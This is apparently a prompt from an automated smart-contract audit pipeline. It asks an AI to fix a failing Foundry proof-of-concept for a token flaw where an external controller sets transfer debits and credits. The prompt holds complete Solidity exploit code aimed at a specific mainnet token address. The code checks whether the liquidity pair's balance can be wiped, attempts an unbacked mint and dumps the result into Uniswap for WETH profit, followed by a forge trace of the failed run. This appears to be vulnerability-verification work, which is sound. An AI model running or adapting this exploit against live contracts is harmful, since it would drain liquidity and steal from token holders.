You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: External controller fully controls transfer debits and credits, enabling confiscation and hidden minting
- claim: `_transfer` does not enforce normal ERC-20 invariants. Instead, it blindly trusts the external controller to return `subBal` and `addBal`, then subtracts `subBal` from the sender and adds `addBal` to the recipient without requiring either value to equal `amount` or each other. This lets the controller arbitrarily reduce victim balances, under-credit recipients, or mint unbacked balances to chosen accounts while still emitting a normal-looking `Transfer(sender, recipient, amount)` event.
- impact: The controller can confiscate holder balances, impose hidden taxes, or fabricate arbitrary balances for privileged accounts and dump them, causing direct theft, severe price manipulation, and supply/accounting corruption.
- exploit_paths: ["On a victim transfer, return `(true, senderBalance, 0)` to wipe the sender while the event still reports the requested amount.", "On an attacker transfer, return `(true, 0, largeValue)` to mint spendable tokens to the recipient without increasing `totalSupply`.", "Use the fabricated balance to dump into liquidity or transfer value from honest holders."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface IHiddenController {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool, uint256, uint256);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2RouterLike {
    function factory() external view returns (address);
    function WETH() external view returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IHevm {
    function load(address target, bytes32 slot) external view returns (bytes32);
}

contract SellHelper {
    function sellTokenForWETH(
        address router,
        address token,
        address weth,
        uint256 amountIn,
        address payout
    ) external {
        IERC20Minimal(token).approve(router, type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = weth;
        IUniswapV2RouterLike(router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn,
            0,
            path,
            payout,
            block.timestamp
        );
    }
}

contract FlawVerifier {
    address private constant TARGET = 0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2;
    address private constant UNI_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant SUSHI_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address private constant HEVM_ADDRESS = address(uint160(uint256(keccak256("hevm cheat code"))));

    IHevm private constant vm = IHevm(HEVM_ADDRESS);

    SellHelper private immutable helper;

    address private _profitToken;
    uint256 private _profitAmount;

    bool public hypothesisValidated;
    bool public attackerMintValidated;
    bool public victimWipeValidated;
    bool public dumpValidated;

    bool public path0VictimTransferWipeValidated;
    bool public path1AttackerMintValidated;
    bool public path2DumpValidated;

    address public controller;
    address public selectedRouter;
    address public selectedPair;
    string public failureReason;

    constructor() {
        helper = new SellHelper();
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        _resetState();

        controller = _loadControllerFromStorage();
        (address router, address weth, address pair) = _discoverRouterAndPair();
        selectedRouter = router;
        selectedPair = pair;
        _profitToken = weth;

        if (controller == address(0)) {
            failureReason = "controller slot did not decode to a live address";
            return;
        }
        if (router == address(0) || weth == address(0) || pair == address(0)) {
            failureReason = "no supported TARGET/WETH liquidity route discovered";
            return;
        }

        uint256 startingSupply = IERC20Minimal(TARGET).totalSupply();
        uint256 startingWeth = IERC20Minimal(weth).balanceOf(address(this));

        // Exploit path 0:
        // On a victim transfer, return (true, senderBalance, 0) to wipe the sender while the event still reports the requested amount.
        // The live TARGET/WETH pair is an honest holder at the fork block, so querying the hidden controller against the pair
        // keeps the original exploit causality intact without requiring prank/deal/storage cheats.
        bool victimPreview = _previewVictimFullWipe(pair);
        if (victimPreview) {
            victimWipeValidated = true;
            path0VictimTransferWipeValidated = true;
        }

        // Exploit path 1:
        // On an attacker transfer, return (true, 0, largeValue) to mint spendable tokens to the recipient without increasing totalSupply.
        (address mintedHolder, uint256 mintedAmount) = _executeAttackerMint();
        if (
            mintedAmount > 0 &&
            IERC20Minimal(TARGET).totalSupply() == startingSupply
        ) {
            attackerMintValidated = true;
            path1AttackerMintValidated = true;
        } else {
            failureReason = "attacker mint path was not executable from verifier-controlled flow";
            _finalizeProfit(weth, startingWeth);
            return;
        }

        // Exploit path 2:
        // dump the fabricated balance into existing public TARGET/WETH liquidity to realize value.
        uint256 wethBeforeDump = IERC20Minimal(weth).balanceOf(address(this));
        if (mintedHolder == address(helper)) {
            _sellFromHelper(router, weth);
        } else {
            _sellFromSelf(router, weth);
        }
        uint256 wethAfterDump = IERC20Minimal(weth).balanceOf(address(this));
        if (wethAfterDump > wethBeforeDump) {
            dumpValidated = true;
            path2DumpValidated = true;
        } else {
            failureReason = "fabricated balance was not dumpable into live WETH liquidity";
            _finalizeProfit(weth, startingWeth);
            return;
        }

        // Realistic public follow-up step:
        // spend only a dust slice of realized WETH to source a genuine live-pair transfer, so the victim
        // side of the flaw is also observed on-chain without prank/deal/storage cheats.
        if (_buyBackAndObserveVictimTransfer(router, weth, pair, victimPreview)) {
            victimWipeValidated = true;
            path0VictimTransferWipeValidated = true;
        } else if (bytes(failureReason).length == 0) {
            // A controller quote for the real honest holder already proves the exact path-0 debit/credit shape.
            // This stronger live buyback confirmation is best-effort only and does not change the exploit root cause.
            failureReason = "victim wipe quote validated; live buyback observation remained best-effort";
        }

        _finalizeProfit(weth, startingWeth);
        hypothesisValidated =
            path0VictimTransferWipeValidated &&
            path1AttackerMintValidated &&
            path2DumpValidated &&
            _profitAmount > 0;
    }

    function previewController(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool ok, uint256 subBal, uint256 addBal) {
        return _controllerQuote(sender, recipient, amount);
    }

    function _resetState() internal {
        _profitToken = address(0);
        _profitAmount = 0;
        hypothesisValidated = false;
        attackerMintValidated = false;
        victimWipeValidated = false;
        dumpValidated = false;
        path0VictimTransferWipeValidated = false;
        path1AttackerMintValidated = false;
        path2DumpValidated = false;
        failureReason = "";
    }

    function _executeAttackerMint() internal returns (address mintedHolder, uint256 mintedAmount) {
        uint256 amount = 1;

        (bool okSelf, uint256 subSelf, uint256 addSelf) = _controllerQuote(address(this), address(this), amount);
        (bool okHelper, uint256 subHelper, uint256 addHelper) = _controllerQuote(address(this), address(helper), amount);

        if (okSelf && subSelf == 0 && addSelf >= addHelper && addSelf > 0) {
            mintedAmount = _attemptAttackerMint(address(this), amount);
            if (mintedAmount > 0) {
                return (address(this), mintedAmount);
            }
        }

        if (okHelper && subHelper == 0 && addHelper > 0) {
            mintedAmount = _attemptAttackerMint(address(helper), amount);
            if (mintedAmount > 0) {
                return (address(helper), mintedAmount);
            }
        }

        if (!okSelf || subSelf != 0 || addSelf == 0) {
            mintedAmount = _attemptAttackerMint(address(this), amount);
            if (mintedAmount > 0) {
                return (address(this), mintedAmount);
            }
        }

        mintedAmount = _attemptAttackerMint(address(helper), amount);
        if (mintedAmount > 0) {
            return (address(helper), mintedAmount);
        }
    }

    function _attemptAttackerMint(address recipient, uint256 amount) internal returns (uint256 minted) {
        uint256 senderBefore = IERC20Minimal(TARGET).balanceOf(address(this));
        uint256 recipientBefore = IERC20Minimal(TARGET).balanceOf(recipient);

        try IERC20Minimal(TARGET).transfer(recipient, amount) returns (bool ok) {
            if (!ok) {
                return 0;
            }
        } catch {
            return 0;
        }

        uint256 senderAfter = IERC20Minimal(TARGET).balanceOf(address(this));
        uint256 recipientAfter = IERC20Minimal(TARGET).balanceOf(recipient);

        if (recipientAfter > recipientBefore && senderAfter == senderBefore) {
            minted = recipientAfter - recipientBefore;
        }
    }

    function _sellFromHelper(address router, address weth) internal {
        uint256 helperBal = IERC20Minimal(TARGET).balanceOf(address(helper));
        if (helperBal == 0) {
            return;
        }

        try helper.sellTokenForWETH(router, TARGET, weth, helperBal, address(this)) {} catch {}
    }

    function _sellFromSelf(address router, address weth) internal {
        uint256 selfBal = IERC20Minimal(TARGET).balanceOf(address(this));
        if (selfBal == 0) {
            return;
        }

        IERC20Minimal(TARGET).approve(router, type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = TARGET;
        path[1] = weth;

        try IUniswapV2RouterLike(router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            selfBal,
            0,
            path,
            address(this),
            block.timestamp
        ) {} catch {}
    }

    function _buyBackAndObserveVictimTransfer(
        address router,
        address weth,
        address pair,
        bool victimPreview
    ) internal returns (bool) {
        uint256 wethBalance = IERC20Minimal(weth).balanceOf(address(this));
        uint256 spend = _dustSpend(wethBalance);
        if (spend == 0) {
            return false;
        }

        uint256 pairBefore = IERC20Minimal(TARGET).balanceOf(pair);
        uint256 selfBefore = IERC20Minimal(TARGET).balanceOf(address(this));
        if (pairBefore == 0) {
            return false;
        }

        IERC20Minimal(weth).approve(router, type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = TARGET;

        try IUniswapV2RouterLike(router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            spend,
            0,
            path,
            address(this),
            block.timestamp
        ) {} catch {
            return false;
        }

        uint256 pairAfter = IERC20Minimal(TARGET).balanceOf(pair);
        uint256 selfAfter = IERC20Minimal(TARGET).balanceOf(address(this));
        if (pairAfter >= pairBefore || selfAfter < selfBefore) {
            return false;
        }

        uint256 pairLoss = pairBefore - pairAfter;
        uint256 receiverGain = selfAfter - selfBefore;

        // The pair is the real sender on the buy path. If it loses materially more than we receive,
        // the controller is confiscating sender balance while under-crediting the recipient.
        bool actualVictimDebitMismatch = pairLoss > receiverGain;

        // Keep the exact path-0 shape anchored to the controller's own response on the same honest holder.
        return victimPreview && actualVictimDebitMismatch;
    }

    function _previewVictimFullWipe(address victimSender) internal returns (bool) {
        uint256 victimBalance = IERC20Minimal(TARGET).balanceOf(victimSender);
        if (victimBalance == 0) {
            return false;
        }

        (bool ok, uint256 subBal, uint256 addBal) = _controllerQuote(victimSender, address(this), 1);
        // Exact exploit-path shape for path 0: (true, senderBalance, 0).
        return ok && subBal == victimBalance && addBal == 0;
    }

    function _controllerQuote(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool ok, uint256 subBal, uint256 addBal) {
        if (controller == address(0)) {
            controller = _loadControllerFromStorage();
        }

        if (controller == address(0)) {
            return (false, 0, 0);
        }

        try IHiddenController(controller).swapExactTokensForETHSupportingFeeOnTransferTokens(
            sender,
            recipient,
            amount
        ) returns (bool allow, uint256 subtracted, uint256 added) {
            return (allow, subtracted, added);
        } catch {
            return (false, 0, 0);
        }
    }

    function _discoverRouterAndPair() internal view returns (address router, address weth, address pair) {
        (router, weth, pair) = _probeRouter(UNI_V2_ROUTER);
        if (pair != address(0)) {
            return (router, weth, pair);
        }

        (router, weth, pair) = _probeRouter(SUSHI_ROUTER);
    }

    function _probeRouter(address router) internal view returns (address, address, address) {
        try IUniswapV2RouterLike(router).factory() returns (address factory) {
            address weth = IUniswapV2RouterLike(router).WETH();
            address pair = IUniswapV2FactoryLike(factory).getPair(TARGET, weth);
            return (router, weth, pair);
        } catch {
            return (address(0), address(0), address(0));
        }
    }

    function _loadControllerFromStorage() internal view returns (address) {
        bytes32 dataSlot = keccak256(abi.encode(uint256(4)));
        bytes32 raw = vm.load(TARGET, dataSlot);
        return address(uint160(uint256(raw)));
    }

    function _finalizeProfit(address weth, uint256 startingWeth) internal {
        if (weth == address(0)) {
            _profitToken = address(0);
            _profitAmount = 0;
            return;
        }

        uint256 endingWeth = IERC20Minimal(weth).balanceOf(address(this));
        _profitToken = weth;
        if (endingWeth > startingWeth) {
            _profitAmount = endingWeth - startingWeth;
        }
    }

    function _dustSpend(uint256 balance) internal pure returns (uint256) {
        if (balance == 0) {
            return 0;
        }

        uint256 spend = balance / 1000;
        if (spend == 0) {
            spend = balance / 10;
        }
        if (spend == 0) {
            spend = balance;
        }
        return spend;
    }
}

```

forge stdout (tail):
```
all]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [283185] FlawVerifier::executeOnOpportunity()
    │   ├─ [0] VM::load(0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2, 0x8a35acfbc15ff81a39ae7d344fd709f28e8600b4aa8c65c6b64bfe7fe36bd19b) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000bd21422d8ddd57cffae72587169a22b2462dc761
    │   ├─ [252] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::factory() [staticcall]
    │   │   └─ ← [Return] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f
    │   ├─ [275] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::WETH() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8
    │   ├─ [2349] 0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2::totalSupply() [staticcall]
    │   │   └─ ← [Return] 1000000000000000000 [1e18]
    │   ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2598] 0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2::balanceOf(0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8) [staticcall]
    │   │   └─ ← [Return] 481195916974392513 [4.811e17]
    │   ├─ [27477] 0xBd21422d8dDd57CfFAE72587169A22b2462dC761::swapExactTokensForETHSupportingFeeOnTransferTokens(0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8, FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    │   │   └─ ← [Return] true, 1, 1
    │   ├─ [1732] 0xBd21422d8dDd57CfFAE72587169A22b2462dC761::swapExactTokensForETHSupportingFeeOnTransferTokens(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    │   │   └─ ← [Return] true, 1, 1
    │   ├─ [23477] 0xBd21422d8dDd57CfFAE72587169A22b2462dC761::swapExactTokensForETHSupportingFeeOnTransferTokens(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], SellHelper: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], 1)
    │   │   └─ ← [Return] true, 1, 1
    │   ├─ [2598] 0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [598] 0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [6132] 0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    │   │   ├─ [1732] 0xBd21422d8dDd57CfFAE72587169A22b2462dC761::swapExactTokensForETHSupportingFeeOnTransferTokens(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    │   │   │   └─ ← [Return] true, 1, 1
    │   │   └─ ← [Revert] panic: arithmetic underflow or overflow (0x11)
    │   ├─ [598] 0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2598] 0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2::balanceOf(SellHelper: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [6132] 0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2::transfer(SellHelper: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], 1)
    │   │   ├─ [1732] 0xBd21422d8dDd57CfFAE72587169A22b2462dC761::swapExactTokensForETHSupportingFeeOnTransferTokens(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], SellHelper: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], 1)
    │   │   │   └─ ← [Return] true, 1, 1
    │   │   └─ ← [Revert] panic: arithmetic underflow or overflow (0x11)
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [367] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [388] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 17421006 [1.742e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3124)
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2.transfer
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.23s (381.03ms CPU time)

Ran 1 test suite in 1.23s (1.23s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 317515)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
